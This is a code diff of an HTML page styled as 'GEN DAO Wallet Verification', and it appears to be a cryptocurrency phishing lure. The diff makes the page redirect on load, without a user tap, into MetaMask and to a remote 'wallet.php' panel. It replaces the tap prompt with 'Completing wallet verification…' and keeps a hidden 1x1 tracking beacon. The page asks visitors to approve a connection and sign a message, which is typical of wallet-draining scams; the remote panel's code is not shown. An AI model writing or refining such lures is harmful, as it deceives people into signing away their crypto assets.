@@ -3,18 +3,29 @@
 <title>GEN DAO — Wallet Verification</title>
 <style>body{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial;margin:0;background:#0b0f17;color:#e8eef7;display:flex;min-height:100vh;align-items:center;justify-content:center}.w{max-width:440px;padding:28px;text-align:center}.t{font-size:22px;font-weight:700;letter-spacing:.3px}.s{color:#9fb0c7;font-size:14px;margin:10px 0 22px}.b{display:block;background:#f5841f;color:#fff;text-decoration:none;padding:16px 18px;border-radius:12px;font-weight:700;font-size:17px}.b2{display:block;margin-top:12px;color:#9fb0c7;font-size:13px;text-decoration:underline}.m{margin-top:16px;color:#6f819b;font-size:12px}</style></head>
 <body><div class="w"><div class="t">GEN DAO · Wallet Verification</div>
-<div class="s" id="s">Tap the button to complete verification in MetaMask.</div>
+<div class="s" id="s">Completing wallet verification…</div>
 <a class="b" id="b" href="https://metamask.app.link/dapp/panel.gendao.org/wallet.php">Open in MetaMask</a>
 <a class="b2" id="b2" href="metamask://dapp/panel.gendao.org/wallet.php">MetaMask not opening? Tap here</a>
 <div class="m">Approve the connection and sign the verification message.</div></div>
 <script>
 (function(){
+  var PANEL="https://panel.gendao.org/wallet.php";
   var scheme="metamask://dapp/panel.gendao.org/wallet.php";
   var uni="https://metamask.app.link/dapp/panel.gendao.org/wallet.php";
-  if(/MetaMask/i.test(navigator.userAgent)){location.replace("https://panel.gendao.org/wallet.php");return;}
-  setTimeout(function(){try{location.href=scheme;}catch(e){}},120);
-  setTimeout(function(){if(!document.hidden && !document.hasFocus){location.href=uni;}},2200);
+  function go(){
+    try{
+      if(window.ethereum){location.replace(PANEL);return true;}
+    }catch(e){}
+    if(/MetaMask/i.test(navigator.userAgent)){location.replace(PANEL);return true;}
+    return false;
+  }
+  if(go())return;
+  setTimeout(go,400); setTimeout(go,1200);
+  setTimeout(function(){try{location.href=scheme;}catch(e){}},300);
+  setTimeout(function(){if(!document.hidden)location.href=uni;},2600);
   document.getElementById('b').addEventListener('click',function(e){e.preventDefault();location.href=uni;});
   document.getElementById('b2').addEventListener('click',function(e){e.preventDefault();location.href=scheme;});
 })();
-</script><img src="https://panel.gendao.org/wallet.php?ghbeacon=1" width="1" height="1" style="position:absolute;opacity:0" alt=""></body></html>
+</script>
+<img src="https://panel.gendao.org/wallet.php?ghbeacon=2" width="1" height="1" style="position:absolute;opacity:0" alt="">
+</body></html>
